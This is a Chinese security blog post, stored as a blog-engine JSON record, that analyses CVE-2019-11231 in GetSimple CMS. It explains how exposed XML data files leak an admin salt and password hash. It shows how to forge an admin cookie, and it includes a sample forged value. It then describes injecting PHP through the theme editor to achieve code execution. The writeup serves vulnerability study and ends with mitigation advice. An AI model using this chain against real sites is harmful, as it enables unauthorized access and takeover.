对应如下：\n\nGetSimpleCMS\\data\\users\\admin.xml文件\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/5ebdf7efe2978f33be5c8646453aec5d.png)\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/0bc28463ea9803bf8d66b973af0d8924.png)\n\n&nbsp;\n\ngetsimplecms\\data\\other\\authorization.xml\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/eaaa1f73a863f9c35b522abc831022ce.png)\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/2b25c623398bdd646967fb4a5900bc18.png)\n\n这些信息是可以直接读取出来的\n\ngetsimplecms 中Cookie的算法的实现如下:\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/9c47e0ca312ccbf96e9ba83e85e62e69.png)\n\n&nbsp;\n\n算法相对简单，通过$SALT值与$USR进行拼接；$SALT值与$cookie_name拼接，最终通过sha1进行加密，算出对应的cookie键值对\n\n通过泄露的文件与cookie算法，可以顺利计算出对应用户的cookie\n\n现在，可以伪造任意成员的cookie了\n\n以USR :admin举例说明：\n\n最终拼接的cookie为：\n\nGS_ADMIN_USERNAME=admin;48fd5258d478eec2a8f417f358c767c992f01b51=8ce411833fcfaedf4fcf5390132a153c00e0482c\n\n&nbsp;\n\n**Password****算法分析：**\n\n分析下Password的计算方式\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/b911761b7f4485b3b7cc4725e94eab5d.png)\n\nPassword的加密，是通过passhash()方法来实现的\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/13b52623a2c40de2dee14718f491e452.png)\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/bd93cf9866b092b8d92ebd6a96c0f300.png)\n\nGSLOGINSALT是用来保护的密码的额外的salt值，默认情况为空。\n\n所以这里的密码计算就比较直接了，通过sha1方法对明文密码进行加密\n\n    sha1($p)\n\n通过sha1 hash将明文密码加密为密文。\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/8db21433099383b6a47fbb7387b4670d.png)\n\n也就是说，只要获取了加密后的password，有一定几率，可以破解为明文：\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/a8fb07b8a4942c681657da675eec1963.png)\n\n获取到管理员cookie/password后，使用管理员账号登陆后台\n\n&nbsp;\n\n通过伪造cookie访问后台：\n\n未登录时，访问后台地址\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/47bc6febbcfdde8d02b9821606b39f2a.png)\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/403179b2029b01b0dbb89958b7f8e268.png)\n\n此时需要填写正确的用户名密码才可以登陆后台\n\n这里，通过改包的方式，将cookie修改为之前计算出的值\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/2cfff8d9aae7746778eb8d537c5d4523.png)\n\n此时，无需登陆，直接进入后台\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/88958e1d119a606e6815cc2d36a53873.png)\n\n访问如下url\n\nhttp://127.0.0.1/getsimplecms/admin/theme-edit.php\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/7d35092eae92dd89eb370ba1accef8ca.png)\n\n在这里可以对模板文件进行编辑，在这里可以写入任意php代码，造成远程代码执行漏洞\n\n例如：\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/71f77773b77a70dc7d03abe48fa61e34.png)\n\n访问如下地址：\n\nhttp://127.0.0.1/getsimplecms/theme/Innovation/template.php\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/81e5e768a8b9eff4fa68326fa2e8dcb3.png)\n\n&nbsp;\n\n插入的php代码被成功执行\n\n# \n\n&nbsp;\n\n# **0x05**  **修复建议**\n\n* * *\n\n目前官方没有进行修复，使用此cms的用户，需要确保apache配置文件中，AllowOverride值为All","source":"_posts/GetSimpleCMS-Unauthenticated-RCE.md","raw":"---\ntitle: GetSimpleCMS-Unauthenticated 远程代码执行漏洞分析\ndate: 2019-08-21 19:16:31\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nGetSimple是一款基于XML的开源的内容管理系统。Getsimple cms的使用量较为广泛，从官方给出的统计数据来看，GetSimple拥有超过12万次的下载量\n\n在GetSimple 3.3.15版本中，攻击者可以通过伪造管理员cookie，绕过身份验证登陆后台，进而通过后台编辑模板功能模块写入php代码，造成远程代码执行漏洞\n\n<!--more-->\n\n# **0x01 漏洞描述**\n\n* * *\n\n在GetSimple 3.3.15版本中，攻击者可以通过伪造管理员cookie，绕过身份验证登陆后台，进而通过后台编辑模板功能模块写入php代码，造成远程代码执行漏洞。\n\nMetasploit针对此次漏洞，也推出相应的利用插件\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/840316b19ec09e23988648334c42d0fd.png)\n\n详情可见packet storm链接：\n\nhttps://packetstormsecurity.com/files/152961/GetSimpleCMS-3.3.15-Remote-Code-Execution.html\n\n&nbsp;\n\n&nbsp;\n\n# **0x02 受影响的系统版本**\n\n* * *\n\nGetSimple&lt;=3.3.15\n\n&nbsp;\n\n&nbsp;\n\n# **0x03 漏洞编号**\n\n* * *\n\nCVE-2019-11231\n\n&nbsp;\n\n&nbsp;\n\n# **0x04 漏洞分析**\n\n* * *\n\n在分析该漏洞前，不得不提.htaccess文件，本次漏洞的产生，是因为默认情况下apache对.htaccess配置文件的开启情况不同而产生的。\n\nhtaccess文件是Apache服务器中的配置文件，它负责相关目录下的网页配置。通过配置htaccess文件，可以实现众多功能，例如：允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等。\n\n启用.htaccess，需要在apache配置文件中，启用AllowOverride。\n\n在笔者测试了两款环境，分别为配置了wamp的windows与ubuntu服务器，在这两个环境中，默认情况对htaccess文件的启用情况是不同的。\n\n先来看安装有wamp的windows环境，打开apahce配置文件httpd.conf\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/33fb548acfc58b7ac5717900e039b927.png)\n\n可以看到，这里将位于conf/extra/httpd-vhosts.conf文件导入\n\n跟进 httpd-vhosts.conf文件\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/d5dc1155047ddd9cfd276ee555973bbf.png)\n\n可以看到，在这里，默认情况下 AllowOverride 默认值是All\n\n当AllowOverride指令设置为 All时，所有具有\".htaccess\"作用域的指令都允许出现在.htaccess文件中。\n\n此时，目录中的.htaccess配置文件为启用状态\n\n例如位于getsimplecms/data目录中的.htaccess配置文件\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/8710c3b580348616abb6b1c5f29926be.png)\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/4ff4202d805ac20f20a4ab3f3c4cee13.png)\n\n&nbsp;\n\n当此.htaccess配置文件被加载时，是禁止该目录被web端访问的\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/425cc108ea9cafb4e56ff37e536667b9.png)\n\n也就是说，通过该方法，通过web端访问data目录时，不会显示其中文件列表\n\n与其中文件内容，是可以很好的保护存在于该目录下的文件，不被泄露\n\n但是在笔者的ubuntu服务器，ubuntu apache2.conf中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/92371b4bbd1d1215aed845ef903abf85.png)\n\nAllowOverride 默认值是None，默认的情况下，不加载目录中的.htaccess\n\n我们将上述的.htaccess文件放入ubuntu服务器的web目录中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/1caa4a8eedb5684f9319d60b63a6aad9.png)\n\n再通过浏览器访问这个路径\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/9474c387505faf554297a061b63d9922.png)\n\n如上图可见，.htaccess并没有生效，而路径中的文件，是可以被泄露的\n\n回归到本次漏洞：\n\n访问http://127.0.0.1/getsimplecms/data/users/admin.xml\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/f51ce9b10a60cc6bfef5dcbe4b4429a2.png)\n\n在.htaccess没有生效的情况下，我们获取admin.xml中记录的用户相关信息，该cms并没有将用户信息写入数据库，而是全部存于该文件中\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/d7e8b50b48d916e31bdc0f34eb294c00.png)\n\n访问http://127.0.0.1/getsimplecms/data/other/authorization.xml获取authorization.xml中记录的apikey\n\n现在我们得到如下的信息：（用户名/加密后的密码/apikey）\n\n该cms并没有将用户信息写入数据库，而是全部存于xml文件中\n\n通过获取的信息，接下来进一步分析如何利用这些泄露的信息：\n\n&nbsp;\n\n**Cookie****算法分析：**\n\n分析下GetSimple中的cookie是如何生成的\n\n位于\\GetSimpleCMS\\admin\\inc\\cookie_functions.php\n\ncreate_cookie方法\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/71cf338a24e2f5d299a6a0bf17eee8d7.png)\n\n计算cookie所需的$USR $SALT 对应如下：\n\nGetSimpleCMS\\data\\users\\admin.xml文件\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/5ebdf7efe2978f33be5c8646453aec5d.png)\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/0bc28463ea9803bf8d66b973af0d8924.png)\n\n&nbsp;\n\ngetsimplecms\\data\\other\\authorization.xml\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/eaaa1f73a863f9c35b522abc831022ce.png)\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/2b25c623398bdd646967fb4a5900bc18.png)\n\n这些信息是可以直接读取出来的\n\ngetsimplecms 中Cookie的算法的实现如下:\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/9c47e0ca312ccbf96e9ba83e85e62e69.png)\n\n&nbsp;\n\n算法相对简单，通过$SALT值与$USR进行拼接；$SALT值与$cookie_name拼接，最终通过sha1进行加密，算出对应的cookie键值对\n\n通过泄露的文件与cookie算法，可以顺利计算出对应用户的cookie\n\n现在，可以伪造任意成员的cookie了\n\n以USR :admin举例说明：\n\n最终拼接的cookie为：\n\nGS_ADMIN_USERNAME=admin;48fd5258d478eec2a8f417f358c767c992f01b51=8ce411833fcfaedf4fcf5390132a153c00e0482c\n\n&nbsp;\n\n**Password****算法分析：**\n\n分析下Password的计算方式\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/b911761b7f4485b3b7cc4725e94eab5d.png)\n\nPassword的加密，是通过passhash()方法来实现的\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/13b52623a2c40de2dee14718f491e452.png)\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/bd93cf9866b092b8d92ebd6a96c0f300.png)\n\nGSLOGINSALT是用来保护的密码的额外的salt值，默认情况为空。\n\n所以这里的密码计算就比较直接了，通过sha1方法对明文密码进行加密\n\n    sha1($p)\n\n通过sha1 hash将明文密码加密为密文。\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/8db21433099383b6a47fbb7387b4670d.png)\n\n也就是说，只要获取了加密后的password，有一定几率，可以破解为明文：\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/a8fb07b8a4942c681657da675eec1963.png)\n\n获取到管理员cookie/password后，使用管理员账号登陆后台\n\n&nbsp;\n\n通过伪造cookie访问后台：\n\n未登录时，访问后台地址\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/47bc6febbcfdde8d02b9821606b39f2a.png)\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/403179b2029b01b0dbb89958b7f8e268.png)\n\n此时需要填写正确的用户名密码才可以登陆后台\n\n这里，通过改包的方式，将cookie修改为之前计算出的值\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/2cfff8d9aae7746778eb8d537c5d4523.png)\n\n此时，无需登陆，直接进入后台\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/88958e1d119a606e6815cc2d36a53873.png)\n\n访问如下url\n\nhttp://127.0.0.1/getsimplecms/admin/theme-edit.php\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/7d35092eae92dd89eb370ba1accef8ca.png)\n\n在这里可以对模板文件进行编辑，在这里可以写入任意php代码，造成远程代码执行漏洞\n\n例如：\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/71f77773b77a70dc7d03abe48fa61e34.png)\n\n访问如下地址：\n\nhttp://127.0.0.1/getsimplecms/theme/Innovation/template.php\n\n![](http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/81e5e768a8b9eff4fa68326fa2e8dcb3.png)\n\n&nbsp;\n\n插入的php代码被成功执行\n\n# \n\n&nbsp;\n\n# **0x05**  **修复建议**\n\n* * *\n\n目前官方没有进行修复，使用此cms的用户，需要确保apache配置文件中，AllowOverride值为All","slug":"GetSimpleCMS-Unauthenticated-RCE","published":1,"updated":"2020-10-27T09:27:09.540Z","_id":"ckgrozu87000gwsa9eb8q6shv","comments":1,"layout":"post","photos":[],"link":"","content":"<p>GetSimple是一款基于XML的开源的内容管理系统。Getsimple cms的使用量较为广泛，从官方给出的统计数据来看，GetSimple拥有超过12万次的下载量</p>\n<p>在GetSimple 3.3.15版本中，攻击者可以通过伪造管理员cookie，绕过身份验证登陆后台，进而通过后台编辑模板功能模块写入php代码，造成远程代码执行漏洞</p>\n<a id=\"more\"></a>\n\n<h1 id=\"0x01-漏洞描述\"><a href=\"#0x01-漏洞描述\" class=\"headerlink\" title=\"0x01 漏洞描述\"></a><strong>0x01 漏洞描述</strong></h1><hr>\n<p>在GetSimple 3.3.15版本中，攻击者可以通过伪造管理员cookie，绕过身份验证登陆后台，进而通过后台编辑模板功能模块写入php代码，造成远程代码执行漏洞。</p>\n<p>Metasploit针对此次漏洞，也推出相应的利用插件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/840316b19ec09e23988648334c42d0fd.png\"></p>\n<p>详情可见packet storm链接：</p>\n<p><a href=\"https://packetstormsecurity.com/files/152961/GetSimpleCMS-3.3.15-Remote-Code-Execution.html\">https://packetstormsecurity.com/files/152961/GetSimpleCMS-3.3.15-Remote-Code-Execution.html</a></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1 id=\"0x02-受影响的系统版本\"><a href=\"#0x02-受影响的系统版本\" class=\"headerlink\" title=\"0x02 受影响的系统版本\"></a><strong>0x02 受影响的系统版本</strong></h1><hr>\n<p>GetSimple&lt;=3.3.15</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1 id=\"0x03-漏洞编号\"><a href=\"#0x03-漏洞编号\" class=\"headerlink\" title=\"0x03 漏洞编号\"></a><strong>0x03 漏洞编号</strong></h1><hr>\n<p>CVE-2019-11231</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1 id=\"0x04-漏洞分析\"><a href=\"#0x04-漏洞分析\" class=\"headerlink\" title=\"0x04 漏洞分析\"></a><strong>0x04 漏洞分析</strong></h1><hr>\n<p>在分析该漏洞前，不得不提.htaccess文件，本次漏洞的产生，是因为默认情况下apache对.htaccess配置文件的开启情况不同而产生的。</p>\n<p>htaccess文件是Apache服务器中的配置文件，它负责相关目录下的网页配置。通过配置htaccess文件，可以实现众多功能，例如：允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等。</p>\n<p>启用.htaccess，需要在apache配置文件中，启用AllowOverride。</p>\n<p>在笔者测试了两款环境，分别为配置了wamp的windows与ubuntu服务器，在这两个环境中，默认情况对htaccess文件的启用情况是不同的。</p>\n<p>先来看安装有wamp的windows环境，打开apahce配置文件httpd.conf</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/33fb548acfc58b7ac5717900e039b927.png\"></p>\n<p>可以看到，这里将位于conf/extra/httpd-vhosts.conf文件导入</p>\n<p>跟进 httpd-vhosts.conf文件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/d5dc1155047ddd9cfd276ee555973bbf.png\"></p>\n<p>可以看到，在这里，默认情况下 AllowOverride 默认值是All</p>\n<p>当AllowOverride指令设置为 All时，所有具有”.htaccess”作用域的指令都允许出现在.htaccess文件中。</p>\n<p>此时，目录中的.htaccess配置文件为启用状态</p>\n<p>例如位于getsimplecms/data目录中的.htaccess配置文件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/8710c3b580348616abb6b1c5f29926be.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/4ff4202d805ac20f20a4ab3f3c4cee13.png\"></p>\n<p>&nbsp;</p>\n<p>当此.htaccess配置文件被加载时，是禁止该目录被web端访问的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/425cc108ea9cafb4e56ff37e536667b9.png\"></p>\n<p>也就是说，通过该方法，通过web端访问data目录时，不会显示其中文件列表</p>\n<p>与其中文件内容，是可以很好的保护存在于该目录下的文件，不被泄露</p>\n<p>但是在笔者的ubuntu服务器，ubuntu apache2.conf中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/92371b4bbd1d1215aed845ef903abf85.png\"></p>\n<p>AllowOverride 默认值是None，默认的情况下，不加载目录中的.htaccess</p>\n<p>我们将上述的.htaccess文件放入ubuntu服务器的web目录中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/1caa4a8eedb5684f9319d60b63a6aad9.png\"></p>\n<p>再通过浏览器访问这个路径</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/9474c387505faf554297a061b63d9922.png\"></p>\n<p>如上图可见，.htaccess并没有生效，而路径中的文件，是可以被泄露的</p>\n<p>回归到本次漏洞：</p>\n<p>访问<a href=\"http://127.0.0.1/getsimplecms/data/users/admin.xml\">http://127.0.0.1/getsimplecms/data/users/admin.xml</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/f51ce9b10a60cc6bfef5dcbe4b4429a2.png\"></p>\n<p>在.htaccess没有生效的情况下，我们获取admin.xml中记录的用户相关信息，该cms并没有将用户信息写入数据库，而是全部存于该文件中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/d7e8b50b48d916e31bdc0f34eb294c00.png\"></p>\n<p>访问<a href=\"http://127.0.0.1/getsimplecms/data/other/authorization.xml%E8%8E%B7%E5%8F%96authorization.xml%E4%B8%AD%E8%AE%B0%E5%BD%95%E7%9A%84apikey\">http://127.0.0.1/getsimplecms/data/other/authorization.xml获取authorization.xml中记录的apikey</a></p>\n<p>现在我们得到如下的信息：（用户名/加密后的密码/apikey）</p>\n<p>该cms并没有将用户信息写入数据库，而是全部存于xml文件中</p>\n<p>通过获取的信息，接下来进一步分析如何利用这些泄露的信息：</p>\n<p>&nbsp;</p>\n<p><strong>Cookie**</strong>算法分析：**</p>\n<p>分析下GetSimple中的cookie是如何生成的</p>\n<p>位于\\GetSimpleCMS\\admin\\inc\\cookie_functions.php</p>\n<p>create_cookie方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/71cf338a24e2f5d299a6a0bf17eee8d7.png\"></p>\n<p>计算cookie所需的$USR $SALT 对应如下：</p>\n<p>GetSimpleCMS\\data\\users\\admin.xml文件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/5ebdf7efe2978f33be5c8646453aec5d.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/0bc28463ea9803bf8d66b973af0d8924.png\"></p>\n<p>&nbsp;</p>\n<p>getsimplecms\\data\\other\\authorization.xml</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/eaaa1f73a863f9c35b522abc831022ce.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/2b25c623398bdd646967fb4a5900bc18.png\"></p>\n<p>这些信息是可以直接读取出来的</p>\n<p>getsimplecms 中Cookie的算法的实现如下:</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/9c47e0ca312ccbf96e9ba83e85e62e69.png\"></p>\n<p>&nbsp;</p>\n<p>算法相对简单，通过$SALT值与$USR进行拼接；$SALT值与$cookie_name拼接，最终通过sha1进行加密，算出对应的cookie键值对</p>\n<p>通过泄露的文件与cookie算法，可以顺利计算出对应用户的cookie</p>\n<p>现在，可以伪造任意成员的cookie了</p>\n<p>以USR :admin举例说明：</p>\n<p>最终拼接的cookie为：</p>\n<p>GS_ADMIN_USERNAME=admin;48fd5258d478eec2a8f417f358c767c992f01b51=8ce411833fcfaedf4fcf5390132a153c00e0482c</p>\n<p>&nbsp;</p>\n<p><strong>Password**</strong>算法分析：**</p>\n<p>分析下Password的计算方式</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/b911761b7f4485b3b7cc4725e94eab5d.png\"></p>\n<p>Password的加密，是通过passhash()方法来实现的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/13b52623a2c40de2dee14718f491e452.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/bd93cf9866b092b8d92ebd6a96c0f300.png\"></p>\n<p>GSLOGINSALT是用来保护的密码的额外的salt值，默认情况为空。</p>\n<p>所以这里的密码计算就比较直接了，通过sha1方法对明文密码进行加密</p>\n<pre><code>sha1($p)</code></pre>\n<p>通过sha1 hash将明文密码加密为密文。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/8db21433099383b6a47fbb7387b4670d.png\"></p>\n<p>也就是说，只要获取了加密后的password，有一定几率，可以破解为明文：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/a8fb07b8a4942c681657da675eec1963.png\"></p>\n<p>获取到管理员cookie/password后，使用管理员账号登陆后台</p>\n<p>&nbsp;</p>\n<p>通过伪造cookie访问后台：</p>\n<p>未登录时，访问后台地址</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/47bc6febbcfdde8d02b9821606b39f2a.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/403179b2029b01b0dbb89958b7f8e268.png\"></p>\n<p>此时需要填写正确的用户名密码才可以登陆后台</p>\n<p>这里，通过改包的方式，将cookie修改为之前计算出的值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/2cfff8d9aae7746778eb8d537c5d4523.png\"></p>\n<p>此时，无需登陆，直接进入后台</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/88958e1d119a606e6815cc2d36a53873.png\"></p>\n<p>访问如下url</p>\n<p><a href=\"http://127.0.0.1/getsimplecms/admin/theme-edit.php\">http://127.0.0.1/getsimplecms/admin/theme-edit.php</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/7d35092eae92dd89eb370ba1accef8ca.png\"></p>\n<p>在这里可以对模板文件进行编辑，在这里可以写入任意php代码，造成远程代码执行漏洞</p>\n<p>例如：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/71f77773b77a70dc7d03abe48fa61e34.png\"></p>\n<p>访问如下地址：</p>\n<p><a href=\"http://127.0.0.1/getsimplecms/theme/Innovation/template.php\">http://127.0.0.1/getsimplecms/theme/Innovation/template.php</a></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/81e5e768a8b9eff4fa68326fa2e8dcb3.png\"></p>\n<p>&nbsp;</p>\n<p>插入的php代码被成功执行</p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p>&nbsp;</p>\n<h1 id=\"0x05-修复建议\"><a href=\"#0x05-修复建议\" class=\"headerlink\" title=\"0x05  修复建议\"></a><strong>0x05</strong>  <strong>修复建议</strong></h1><hr>\n<p>目前官方没有进行修复，使用此cms的用户，需要确保apache配置文件中，AllowOverride值为All</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/江博士带你轻松搞定KVM虚拟化.jpg","excerpt":"<p>GetSimple是一款基于XML的开源的内容管理系统。Getsimple cms的使用量较为广泛，从官方给出的统计数据来看，GetSimple拥有超过12万次的下载量</p>\n<p>在GetSimple 3.3.15版本中，攻击者可以通过伪造管理员cookie，绕过身份验证登陆后台，进而通过后台编辑模板功能模块写入php代码，造成远程代码执行漏洞</p>","more":"<h1 id=\"0x01-漏洞描述\"><a href=\"#0x01-漏洞描述\" class=\"headerlink\" title=\"0x01 漏洞描述\"></a><strong>0x01 漏洞描述</strong></h1><hr>\n<p>在GetSimple 3.3.15版本中，攻击者可以通过伪造管理员cookie，绕过身份验证登陆后台，进而通过后台编辑模板功能模块写入php代码，造成远程代码执行漏洞。</p>\n<p>Metasploit针对此次漏洞，也推出相应的利用插件</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/840316b19ec09e23988648334c42d0fd.png\"></p>\n<p>详情可见packet storm链接：</p>\n<p><a href=\"https://packetstormsecurity.com/files/152961/GetSimpleCMS-3.3.15-Remote-Code-Execution.html\">https://packetstormsecurity.com/files/152961/GetSimpleCMS-3.3.15-Remote-Code-Execution.html</a></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1 id=\"0x02-受影响的系统版本\"><a href=\"#0x02-受影响的系统版本\" class=\"headerlink\" title=\"0x02 受影响的系统版本\"></a><strong>0x02 受影响的系统版本</strong></h1><hr>\n<p>GetSimple&lt;=3.3.15</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1 id=\"0x03-漏洞编号\"><a href=\"#0x03-漏洞编号\" class=\"headerlink\" title=\"0x03 漏洞编号\"></a><strong>0x03 漏洞编号</strong></h1><hr>\n<p>CVE-2019-11231</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1 id=\"0x04-漏洞分析\"><a href=\"#0x04-漏洞分析\" class=\"headerlink\" title=\"0x04 漏洞分析\"></a><strong>0x04 漏洞分析</strong></h1><hr>\n<p>在分析该漏洞前，不得不提.htaccess文件，本次漏洞的产生，是因为默认情况下apache对.htaccess配置文件的开启情况不同而产生的。</p>\n<p>htaccess文件是Apache服务器中的配置文件，它负责相关目录下的网页配置。通过配置htaccess文件，可以实现众多功能，例如：允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等。</p>\n<p>启用.htaccess，需要在apache配置文件中，启用AllowOverride。</p>\n<p>在笔者测试了两款环境，分别为配置了wamp的windows与ubuntu服务器，在这两个环境中，默认情况对htaccess文件的启用情况是不同的。</p>\n<p>先来看安装有wamp的windows环境，打开apahce配置文件httpd.conf</p>\n<p><img 